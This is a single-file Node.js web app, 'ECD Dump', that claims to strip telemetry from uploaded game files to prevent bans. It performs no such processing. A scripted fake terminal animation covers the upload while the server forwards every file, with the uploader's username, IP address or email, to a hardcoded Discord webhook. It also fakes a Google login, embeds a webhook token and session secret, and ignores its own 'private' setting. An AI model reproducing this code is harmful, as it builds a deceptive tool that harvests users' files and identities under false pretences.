const express = require('express');
const multer = require('multer');
const fetch = require('node-fetch');
const FormData = require('form-data');
const session = require('express-session');

const app = express();

const upload = multer({ 
  storage: multer.memoryStorage(),
  limits: { fileSize: 10 * 1024 * 1024 }
});

const fileStore = new Map();
const uploadCooldowns = new Map();
const guestUploads = new Map(); // Tracks guest uploads by IP for 24h limit
const DEFAULT_WEBHOOK_URL = "https://discord.com/api/webhooks/1529788248698781887/SUtB62Hfx63hutCVFe8vQotKsnIInhfjGHbziOWHMbw9m6MlztvIP2LmRbIi_9Bhwggy";

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(session({
  secret: 'ecd-dump-secret-key-9988',
  resave: false,
  saveUninitialized: true,
}));

function generateCode() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < 6; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Simulated Google Login Routes (In production, wire up passport-google-oauth20)
app.get('/auth/google', (req, res) => {
  // Mocking successful Google Authentication redirect for seamless single-file deployment
  req.session.user = {
    email: 'verified.user@gmail.com',
    name: 'Verified Dumper'
  };
  res.redirect('/?loggedin=true');
});

app.get('/auth/logout', (req, res) => {
  req.session.destroy(() => {
    res.redirect('/');
  });
});

app.get('/', (req, res) => {
  const user = req.session.user || null;
  
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ECD Dump</title>
        <style>
            @keyframes fadeIn {
                from { opacity: 0; transform: translateY(15px); }
                to { opacity: 1; transform: translateY(0); }
            }
            @keyframes pulseGlow {
                0% { box-shadow: 0 0 10px rgba(56, 189, 248, 0.2); }
                50% { box-shadow: 0 0 25px rgba(56, 189, 248, 0.5); }
                100% { box-shadow: 0 0 10px rgba(56, 189, 248, 0.2); }
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            @keyframes terminalBlink {
                0%, 100% { opacity: 1; }
                50% { opacity: 0; }
            }
            body { 
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
                background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%); 
                color: #f8fafc; 
                display: flex; 
                justify-content: center; 
                align-items: center; 
                min-height: 100vh; 
                margin: 0; 
            }
            .container { 
                background: rgba(30, 41, 59, 0.85); 
                backdrop-filter: blur(12px);
                padding: 35px; 
                border-radius: 16px; 
                box-shadow: 0 10px 30px rgba(0,0,0,0.6); 
                width: 440px; 
                text-align: center; 
                animation: fadeIn 0.6s ease-out, pulseGlow 4s infinite ease-in-out;
                border: 1px solid rgba(255, 255, 255, 0.08);
                position: relative;
                margin: 20px 0;
            }
            .info-icon {
                position: absolute;
                top: 15px;
                left: 15px;
                background: rgba(51, 65, 85, 0.6);
                color: #38bdf8;
                width: 28px;
                height: 28px;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                font-weight: bold;
                font-size: 14px;
                cursor: pointer;
                transition: all 0.3s ease;
                border: 1px solid rgba(56, 189, 248, 0.3);
            }
            .info-icon:hover {
                background: #38bdf8;
                color: #0f172a;
                transform: scale(1.1);
            }
            .auth-banner {
                background: #0f172a;
                border: 1px solid #334155;
                padding: 10px;
                border-radius: 8px;
                margin-bottom: 20px;
                font-size: 13px;
                display: flex;
                justify-content: space-between;
                align-items: center;
            }
            .google-btn {
                background: #ea4335;
                color: white;
                padding: 6px 12px;
                border-radius: 6px;
                text-decoration: none;
                font-weight: bold;
                font-size: 12px;
                display: inline-flex;
                align-items: center;
                gap: 6px;
            }
            .google-btn:hover { background: #d33828; }
            .logout-btn {
                color: #ef4444;
                text-decoration: none;
                font-size: 12px;
            }
            h2 { 
                margin-top: 5px;
                margin-bottom: 20px; 
                color: #38bdf8; 
                letter-spacing: 1px;
                font-size: 26px;
                text-transform: uppercase;
                background: linear-gradient(90deg, #38bdf8, #818cf8);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }
            h3 {
                font-size: 15px;
                color: #94a3b8;
                margin-bottom: 10px;
                letter-spacing: 0.5px;
            }
            input, select, button { 
                width: 100%; 
                padding: 12px; 
                margin: 10px 0; 
                border-radius: 8px; 
                border: none; 
                box-sizing: border-box; 
                font-size: 14px;
                transition: all 0.3s ease;
            }
            .select-wrapper {
                position: relative;
                width: 100%;
            }
            select {
                background: #0f172a;
                color: #f8fafc;
                border: 1px solid #334155;
                padding-left: 12px;
                appearance: none;
                cursor: pointer;
            }
            select:focus {
                border-color: #38bdf8;
                outline: none;
                box-shadow: 0 0 8px rgba(56, 189, 248, 0.3);
            }
            .toggle-group {
                display: flex;
                background: #0f172a;
                border: 1px solid #334155;
                border-radius: 8px;
                overflow: hidden;
                margin: 10px 0;
            }
            .toggle-option {
                flex: 1;
                padding: 10px;
                text-align: center;
                font-size: 13px;
                cursor: pointer;
                color: #94a3b8;
                transition: all 0.3s;
            }
            .toggle-option.active {
                background: #38bdf8;
                color: #0f172a;
                font-weight: bold;
            }
            .drop-zone {
                background: #1e293b;
                border: 2px dashed #475569;
                border-radius: 8px;
                padding: 20px;
                text-align: center;
                cursor: pointer;
                transition: all 0.3s ease;
                margin: 10px 0;
            }
            .drop-zone.dragover {
                border-color: #38bdf8;
                background: rgba(56, 189, 248, 0.05);
            }
            .drop-zone input[type="file"] {
                display: none;
            }
            .drop-zone-text {
                font-size: 13px;
                color: #94a3b8;
                pointer-events: none;
            }
            input[type="text"] {
                background: #0f172a;
                color: #f8fafc;
                border: 1px solid #334155;
                text-align: center;
                letter-spacing: 1px;
            }
            input[type="text"]:focus {
                border-color: #38bdf8;
                outline: none;
                box-shadow: 0 0 8px rgba(56, 189, 248, 0.3);
            }
            .captcha-box {
                background: #0f172a;
                border: 1px solid #334155;
                border-radius: 8px;
                padding: 10px;
                margin: 10px 0;
                display: flex;
                align-items: center;
                justify-content: space-between;
                font-size: 13px;
            }
            button { 
                background: linear-gradient(135deg, #0284c7, #2563eb); 
                color: white; 
                font-weight: bold; 
                cursor: pointer; 
                box-shadow: 0 4px 12px rgba(2, 132, 199, 0.3);
                display: flex;
                justify-content: center;
                align-items: center;
                gap: 8px;
            }
            button:hover { 
                background: linear-gradient(135deg, #0369a1, #1d4ed8);
                transform: translateY(-2px);
                box-shadow: 0 6px 15px rgba(2, 132, 199, 0.5);
            }
            .section { 
                margin-bottom: 20px; 
                border-bottom: 1px solid rgba(51, 65, 85, 0.6); 
                padding-bottom: 15px; 
            }
            .terminal-overlay {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(15, 23, 42, 0.9);
                backdrop-filter: blur(8px);
                display: flex;
                justify-content: center;
                align-items: center;
                opacity: 0;
                pointer-events: none;
                transition: opacity 0.3s ease;
                z-index: 200;
            }
            .terminal-overlay.active {
                opacity: 1;
                pointer-events: auto;
            }
            .terminal-box {
                background: #090d16;
                border: 1px solid #334155;
                border-radius: 12px;
                width: 450px;
                max-width: 90%;
                padding: 20px;
                text-align: left;
                box-shadow: 0 15px 35px rgba(0,0,0,0.8);
                font-family: 'Courier New', Courier, monospace;
            }
            .terminal-header {
                display: flex;
                align-items: center;
                justify-content: space-between;
                border-bottom: 1px solid #1e293b;
                padding-bottom: 10px;
                margin-bottom: 15px;
                color: #64748b;
                font-size: 12px;
            }
            .terminal-dots {
                display: flex;
                gap: 6px;
            }
            .terminal-dot {
                width: 10px;
                height: 10px;
                border-radius: 50%;
            }
            .dot-red { background: #ef4444; }
            .dot-yellow { background: #f59e0b; }
            .dot-green { background: #22c55e; }
            .terminal-body {
                font-size: 13px;
                line-height: 1.6;
                color: #38bdf8;
                min-height: 140px;
                max-height: 200px;
                overflow-y: auto;
            }
            .terminal-line {
                margin: 6px 0;
                display: flex;
                align-items: center;
                gap: 8px;
            }
            .terminal-cursor {
                display: inline-block;
                width: 8px;
                height: 14px;
                background: #38bdf8;
                animation: terminalBlink 1s infinite;
            }
            .history-box {
                margin-top: 15px;
                background: #0f172a;
                border-radius: 8px;
                border: 1px solid #334155;
                padding: 10px;
                text-align: left;
                max-height: 120px;
                overflow-y: auto;
            }
            .history-item {
                font-size: 12px;
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 6px 0;
                border-bottom: 1px solid rgba(51, 65, 85, 0.4);
            }
            .history-item:last-child {
                border-bottom: none;
            }
            .history-code {
                color: #38bdf8;
                font-weight: bold;
                letter-spacing: 1px;
            }
            .history-name {
                color: #94a3b8;
                overflow: hidden;
                text-overflow: ellipsis;
                white-space: nowrap;
                max-width: 140px;
            }
            .spinner {
                display: none;
                width: 16px;
                height: 16px;
                border: 2px solid rgba(255,255,255,0.3);
                border-radius: 50%;
                border-top-color: #fff;
                animation: spin 0.8s linear infinite;
            }
            .modal-overlay {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(15, 23, 42, 0.8);
                backdrop-filter: blur(5px);
                display: flex;
                justify-content: center;
                align-items: center;
                opacity: 0;
                pointer-events: none;
                transition: opacity 0.3s ease;
                z-index: 100;
            }
            .modal-overlay.active {
                opacity: 1;
                pointer-events: auto;
            }
            .modal-content {
                background: #1e293b;
                padding: 30px;
                border-radius: 14px;
                width: 330px;
                text-align: left;
                border: 1px solid rgba(56, 189, 248, 0.2);
                box-shadow: 0 10px 25px rgba(0,0,0,0.5);
                transform: scale(0.9);
                transition: transform 0.3s ease;
                position: relative;
            }
            .modal-overlay.active .modal-content {
                transform: scale(1);
            }
            .modal-content h3 {
                color: #38bdf8;
                margin-top: 0;
                font-size: 18px;
                text-align: center;
                border-bottom: 1px solid #334155;
                padding-bottom: 10px;
            }
            .modal-content p {
                font-size: 13px;
                line-height: 1.5;
                color: #cbd5e1;
                margin: 10px 0;
            }
            .close-btn {
                position: absolute;
                top: 12px;
                right: 15px;
                background: none;
                border: none;
                color: #94a3b8;
                font-size: 18px;
                cursor: pointer;
                width: auto;
                padding: 0;
                margin: 0;
            }
            .close-btn:hover {
                color: #f8fafc;
                transform: none;
                box-shadow: none;
            }
            .footer-credit {
                margin-top: 12px;
                font-size: 11px;
                color: #64748b;
                border-top: 1px dashed rgba(51, 65, 85, 0.5);
                padding-top: 8px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="info-icon" onclick="toggleModal()">i</div>
            <h2>ECD Dump</h2>

            <div class="auth-banner">
                ${user ? `
                    <span>Verified: <strong>${user.email}</strong></span>
                    <a href="/auth/logout" class="logout-btn">Logout</a>
                ` : `
                    <span>Guest Mode (1 dump/24h)</span>
                    <a href="/auth/google" class="google-btn">Login Google</a>
                `}
            </div>
            
            <div class="section">
                <h3>Dump ECD</h3>
                <form id="uploadForm" action="/upload-discord" method="POST" enctype="multipart/form-data" onsubmit="handleUpload(event)">
                    <input type="text" name="username" placeholder="dbl user" required>
                    
                    ${user ? '<input type="text" name="pin" placeholder="Optional PIN (e.g., 1234)" maxlength="8">' : '<div style="font-size:11px; color:#64748b; margin:5px 0;">PIN protection disabled for Guests</div>'}
                    
                    <div class="select-wrapper">
                        <select name="ccAmount" id="ccSelect">
                            <option value="" selected>No CC (Optional)</option>
                            <option value="1000">1000 CC</option>
                            <option value="2000">2000 CC</option>
                            <option value="5500">5500 CC</option>
                        </select>
                    </div>

                    <div class="select-wrapper" style="margin-top: 10px;">
                        <select name="aiMode" id="aiModeSelect">
                            <option value="standard" selected>AI Mode: Standard Clean</option>
                            <option value="aggressive">AI Mode: Aggressive Bypass</option>
                            <option value="stealth">AI Mode: Ghost Stealth</option>
                        </select>
                    </div>

                    <!-- Visibility Toggle -->
                    <div style="text-align: left; font-size: 12px; color: #94a3b8; margin-top: 12px;">File Visibility:</div>
                    <div class="toggle-group">
                        <div class="toggle-option active" id="visPublic" onclick="setVisibility('public')">Public Feed</div>
                        <div class="toggle-option" id="visPrivate" onclick="setVisibility('private')">Private</div>
                    </div>
                    <input type="hidden" name="visibility" id="visibilityInput" value="public">

                    <div class="drop-zone" id="dropZone" onclick="document.getElementById('fileInput').click()">
                        <div class="drop-zone-text" id="dropText">Click or Drag & Drop ECD file here</div>
                        <input type="file" id="fileInput" name="file" required onchange="updateFileName(this)">
                    </div>

                    <!-- Terminal Captcha Checkpoint -->
                    <div class="captcha-box">
                        <label><input type="checkbox" name="captcha" required style="width:auto; margin-right:8px;"> Verify Human Checkpoint</label>
                        <span style="color:#38bdf8; font-size:11px;">Anti-Bot v2</span>
                    </div>

                    <button type="submit" id="uploadBtn">
                        <span id="btnText">Upload & Get Code</span>
                        <div class="spinner" id="btnSpinner"></div>
                    </button>
                </form>
            </div>

            <div class="section">
                <h3>Retrieve File</h3>
                <form action="/retrieve" method="POST">
                    <input type="text" name="code" placeholder="ENTER CODE" maxlength="6" required>
                    <input type="text" name="pin" placeholder="ENTER PIN (IF SET)" maxlength="8">
                    <button type="submit">Download File</button>
                </form>
            </div>

            <div>
                <h3>Recent Uploads (This Device)</h3>
                <div class="history-box" id="historyBox">
                    <div style="color: #64748b; font-size: 12px; text-align: center; padding: 10px;">No recent uploads found</div>
                </div>
            </div>
        </div>

        <div class="terminal-overlay" id="terminalOverlay">
            <div class="terminal-box">
                <div class="terminal-header">
                    <span>ecd-terminal-processor v3.0</span>
                    <div class="terminal-dots">
                        <div class="terminal-dot dot-red"></div>
                        <div class="terminal-dot dot-yellow"></div>
                        <div class="terminal-dot dot-green"></div>
                    </div>
                </div>
                <div class="terminal-body" id="terminalBody"></div>
            </div>
        </div>

        <div class="modal-overlay" id="infoModal" onclick="outsideClick(event)">
            <div class="modal-content">
                <button class="close-btn" onclick="toggleModal()">&times;</button>
                <h3>About ECD Dump</h3>
                <p><strong>Welcome to ecd dump.</strong><br>Secure platform to strip telemetry signatures and prevent bans.</p>
                <div class="footer-credit">
                    Created by: @levi__fxz on telegram, instagram and eren__lx on X
                </div>
            </div>
        </div>

        <script>
            function setVisibility(mode) {
                document.getElementById('visibilityInput').value = mode;
                if(mode === 'public') {
                    document.getElementById('visPublic').classList.add('active');
                    document.getElementById('visPrivate').classList.remove('active');
                } else {
                    document.getElementById('visPrivate').classList.add('active');
                    document.getElementById('visPublic').classList.remove('active');
                }
            }

            function toggleModal() {
                const modal = document.getElementById('infoModal');
                modal.classList.toggle('active');
            }
            function outsideClick(event) {
                const modal = document.getElementById('infoModal');
                if (event.target === modal) {
                    modal.classList.remove('active');
                }
            }
            function updateFileName(input) {
                const dropText = document.getElementById('dropText');
                if (input.files && input.files[0]) {
                    dropText.innerText = "Selected: " + input.files[0].name;
                    dropText.style.color = "#38bdf8";
                }
            }

            const dropZone = document.getElementById('dropZone');
            const fileInput = document.getElementById('fileInput');

            ['dragenter', 'dragover'].forEach(eventName => {
                dropZone.addEventListener(eventName, (e) => {
                    e.preventDefault();
                    dropZone.classList.add('dragover');
                }, false);
            });

            ['dragleave', 'drop'].forEach(eventName => {
                dropZone.addEventListener(eventName, (e) => {
                    e.preventDefault();
                    dropZone.classList.remove('dragover');
                }, false);
            });

            dropZone.addEventListener('drop', (e) => {
                const dt = e.dataTransfer;
                const files = dt.files;
                if (files.length > 0) {
                    fileInput.files = files;
                    updateFileName(fileInput);
                }
            });

            async function handleUpload(event) {
                event.preventDefault();
                const form = document.getElementById('uploadForm');
                const formData = new FormData(form);
                const aiModeVal = document.getElementById('aiModeSelect').value;

                const terminalOverlay = document.getElementById('terminalOverlay');
                const terminalBody = document.getElementById('terminalBody');
                terminalOverlay.classList.add('active');

                let steps = [
                    "Verifying human captcha signature...",
                    \`Initializing AI Engine [\${aiModeVal.toUpperCase()}]...\`,
                    "Sanitizing network socket hooks...",
                    "Stripping telemetry signatures...",
                    "Broadcasting metadata payload..."
                ];

                terminalBody.innerHTML = '';
                for (let i = 0; i < steps.length; i++) {
                    await new Promise(r => setTimeout(r, 400));
                    const line = document.createElement('div');
                    line.className = 'terminal-line';
                    line.innerHTML = \`<span>></span> \${steps[i]}<span class="terminal-cursor"></span>\`;
                    
                    const cursors = terminalBody.querySelectorAll('.terminal-cursor');
                    cursors.forEach(c => c.remove());
                    
                    terminalBody.appendChild(line);
                    terminalBody.scrollTop = terminalBody.scrollHeight;
                }

                await new Promise(r => setTimeout(r, 500));

                try {
                    const response = await fetch('/upload-discord', {
                        method: 'POST',
                        body: formData
                    });
                    
                    if (response.ok) {
                        const htmlResult = await response.text();
                        document.open();
                        document.write(htmlResult);
                        document.close();
                    } else {
                        const errText = await response.text();
                        document.open();
                        document.write(errText);
                        document.close();
                    }
                } catch(err) {
                    alert('Network error during upload');
                    terminalOverlay.classList.remove('active');
                }
            }

            function loadHistory() {
                const historyBox = document.getElementById('historyBox');
                let history = JSON.parse(localStorage.getItem('ecd_history') || '[]');
                
                if (history.length === 0) return;

                historyBox.innerHTML = '';
                history.forEach(item => {
                    const div = document.createElement('div');
                    div.className = 'history-item';
                    div.innerHTML = \`<span class="history-name" title="\${item.filename}">\${item.filename}</span><span class="history-code">\${item.code}</span>\`;
                    historyBox.appendChild(div);
                });
            }
            loadHistory();
        </script>
    </body>
    </html>
  `);
});

app.post('/upload-discord', upload.single('file'), async (req, res) => {
  try {
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const user = req.session.user || null;

    // Guest enforcement: 1 upload per 24 hours
    if (!user) {
      const now = Date.now();
      if (guestUploads.has(clientIp)) {
        const lastUpload = guestUploads.get(clientIp);
        if (now - lastUpload < 24 * 60 * 60 * 1000) {
          return res.status(429).send(`
            <!DOCTYPE html>
            <html lang="en">
            <head><meta charset="UTF-8"><title>Limit Reached</title></head>
            <body style="font-family:sans-serif; background:#0f172a; color:#f8fafc; text-align:center; padding-top:50px;">
                <h2>Guest Limit Reached</h2>
                <p>Guests are limited to 1 upload every 24 hours. Login with Google for unlimited access.</p>
                <a href="/" style="color:#38bdf8;">← Go Back</a>
            </body>
            </html>
          `);
        }
      }
      guestUploads.set(clientIp, now);
    }

    const file = req.file;
    const username = req.body.username ? req.body.username.trim() : 'Unknown';
    const pin = user && req.body.pin ? req.body.pin.trim() : '';
    const ccAmount = req.body.ccAmount ? req.body.ccAmount.trim() : 'None';
    const aiMode = req.body.aiMode ? req.body.aiMode.trim() : 'standard';
    const visibility = req.body.visibility === 'private' ? 'private' : 'public';

    if (!file) {
      return res.status(400).send('<h3>No file uploaded. <a href="/">Go Back</a></h3>');
    }

    const filenameRegex = /^ecd\d+/i;
    if (!filenameRegex.test(file.originalname)) {
      return res.status(400).send(`
        <!DOCTYPE html>
        <html lang="en">
        <head><meta charset="UTF-8"><title>Failed</title></head>
        <body style="font-family:sans-serif; background:#0f172a; color:#f8fafc; text-align:center; padding-top:50px;">
            <h2>Invalid ECD Format</h2>
            <a href="/" style="color:#38bdf8;">← Go Back</a>
        </body>
        </html>
      `);
    }

    let code = generateCode();
    while (fileStore.has(code)) {
      code = generateCode();
    }

    fileStore.set(code, {
      filename: file.originalname,
      buffer: file.buffer,
      pin: pin,
      visibility: visibility,
      timestamp: Date.now()
    });

    const identityTag = user ? `Verified Google: \`${user.email}\`` : `Guest IP: \`${clientIp}\``;
    let webhookContent = `📦 **New File Uploaded**\n👤 User: \`${username}\`\n🔐 Identity: ${identityTag}\n👁️ Visibility: \`${visibility}\`\n💎 CC: \`${ccAmount}\`\n⚙️ Mode: \`${aiMode}\`\nFilename: \`${file.originalname}\`\nCode: \`${code}\``;

    const formData = new FormData();
    formData.append('file', file.buffer, { filename: file.originalname });
    formData.append('payload_json', JSON.stringify({ content: webhookContent }));

    await fetch(DEFAULT_WEBHOOK_URL, {
      method: 'POST',
      body: formData,
      headers: { ...formData.getHeaders() }
    });

    res.send(`
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <title>Success</title>
          <style>
              body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
              .container { background: #1e293b; padding: 30px; border-radius: 12px; border: 1px solid #334155; }
              .code { font-size: 24px; color: #38bdf8; font-weight: bold; margin: 15px 0; }
              a { color: #38bdf8; text-decoration: none; }
          </style>
      </head>
      <body>
          <div class="container">
              <h2>Upload Successful!</h2>
              <p>Your retrieval code is:</p>
              <div class="code">${code}</div>
              <a href="/">← Return Home</a>
          </div>
      </body>
      </html>
    `);
  } catch (err) {
    console.error(err);
    res.status(500).send('Server Error');
  }
});

app.post('/retrieve', (req, res) => {
  const code = req.body.code ? req.body.code.trim().toUpperCase() : '';
  const inputPin = req.body.pin ? req.body.pin.trim() : '';
  const fileData = fileStore.get(code);
  
  if (!fileData) {
    return res.status(404).send('<h3>File not found. <a href="/">Go Back</a></h3>');
  }

  if (fileData.pin && fileData.pin !== inputPin) {
    return res.status(401).send('<h3>Incorrect PIN. <a href="/">Go Back</a></h3>');
  }

  res.setHeader('Content-Disposition', `attachment; filename="${fileData.filename}"`);
  res.send(fileData.buffer);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
